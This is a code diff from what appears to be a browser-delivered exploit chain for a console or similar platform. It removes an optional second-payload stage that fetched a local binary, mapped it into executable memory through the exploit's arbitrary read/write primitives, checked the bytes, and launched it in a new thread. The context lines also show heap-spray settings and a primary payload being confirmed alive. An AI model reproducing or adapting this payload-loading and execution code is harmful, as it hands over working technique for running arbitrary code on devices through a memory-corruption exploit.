@@ -252,23 +252,6 @@ function makeRpc(worker) {
                                        : " entry=NOT-e9")
             : "NOT LOADED -- stage 10 will not run");
 
-        // BELOGAME store-installer test. Inert unless ?storetest=1 is present.
-        const RUN_STORE_TEST = params.get("storetest") === "1";
-        let storeInstaller = null;
-        if (RUN_STORE_TEST) {
-            try {
-                const irsp = await fetch("online-store-installer.bin");
-                if (irsp.ok) storeInstaller = new Uint8Array(await irsp.arrayBuffer());
-            } catch (e) {
-                mark("STORE-INSTALLER-FETCH-FAILED",
-                    (e && e.message) ? e.message : String(e));
-            }
-            mark("STORE-INSTALLER-BLOB", storeInstaller
-                ? "bytes=" + storeInstaller.length + " head="
-                    + hexBytes(storeInstaller.subarray(0, 12))
-                : "NOT LOADED");
-        }
-
         const ITERS = params.has("iters") ? parseInt(params.get("iters"), 10) : 400;
         const SPRAY_NUM = params.has("spray")
             ? parseInt(params.get("spray"), 10) : 0x200;
@@ -3527,66 +3510,6 @@ function makeRpc(worker) {
                                                     mark("PAYLOAD-ALIVE",
                                                         "getpid=" + scAny(SYS.getpid).i32
                                                         + " after=" + PAYLOAD_SETTLE + "ms");
-                                                }
-
-                                                // Optional test-only second payload.
-                                                if (RUN_STORE_TEST && storeInstaller) {
-                                                    try {
-                                                        mark("STORE-INSTALLER-WAIT", "ms=2000");
-                                                        settle(2000);
-                                                        const isize = (storeInstaller.length + 0x3fff) & ~0x3fff;
-                                                        const im = scAny(SYS9.mmap, 0, isize, pr,
-                                                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-                                                        const ientry = new int64(im.lo, im.hi);
-                                                        mark("STORE-INSTALLER-MAP",
-                                                            "size=0x" + isize.toString(16)
-                                                            + " rwx=" + ientry);
-                                                        const ientryOk = im.i32 !== -1
-                                                            && !(ientry.low === 0 && ientry.hi === 0);
-                                                        if (ientryOk) {
-                                                            for (let io = 0; io < storeInstaller.length; io += 8) {
-                                                                let ilo = 0, ihi = 0;
-                                                                for (let ik = 0; ik < 4; ++ik)
-                                                                    ilo |= (storeInstaller[io + ik] || 0) << (8 * ik);
-                                                                for (let ik = 0; ik < 4; ++ik)
-                                                                    ihi |= (storeInstaller[io + 4 + ik] || 0) << (8 * ik);
-                                                                p.write8(ientry.add32(io),
-                                                                    new int64(ilo >>> 0, ihi >>> 0));
-                                                            }
-                                                            let ibad = -1;
-                                                            for (let io = 0; io < storeInstaller.length && ibad < 0; io += 8) {
-                                                                const iw = p.read8(ientry.add32(io));
-                                                                for (let ik = 0; ik < 8; ++ik) {
-                                                                    const iwant = storeInstaller[io + ik];
-                                                                    if (iwant === undefined) continue;
-                                                                    const igot = ik < 4
-                                                                        ? (iw.low >>> (8 * ik)) & 0xff
-                                                                        : (iw.hi >>> (8 * (ik - 4))) & 0xff;
-                                                                    if (igot !== iwant) { ibad = io + ik; break; }
-                                                                }
-                                                            }
-                                                            check("store-installer-rwx-memory", ibad < 0,
-                                                                ibad < 0 ? "" : "mismatch at +0x" + ibad.toString(16));
-                                                            if (ibad < 0) {
-                                                                const ithr = alloc(8);
-                                                                ithr.u8.fill(0);
-                                                                const irc = callAddr(target, ithr.addr, 0,
-                                                                    ientry, 0).i32;
-                                                                const ihandle = new int64(
-                                                                    ithr.dv.getUint32(0, true),
-                                                                    ithr.dv.getUint32(4, true));
-                                                                const irunning = irc === 0 && ihandle.hi > 0;
-                                                                mark("STORE-INSTALLER-PTHREAD",
-                                                                    "rc=" + irc + " handle=" + ihandle);
-                                                                check("store-installer-thread-created", irunning, "");
-                                                                if (irunning)
-                                                                    state("Store installer started...", "ok");
-                                                            }
-                                                        }
-                                                    } catch (e) {
-                                                        mark("STORE-INSTALLER-THREW",
-                                                            (e && e.message) ? e.message : String(e));
-                                                    }
                                                 }
                                         } else if (!target) {
                                             mark("PAYLOAD-MAPPED-NOT-LAUNCHED",
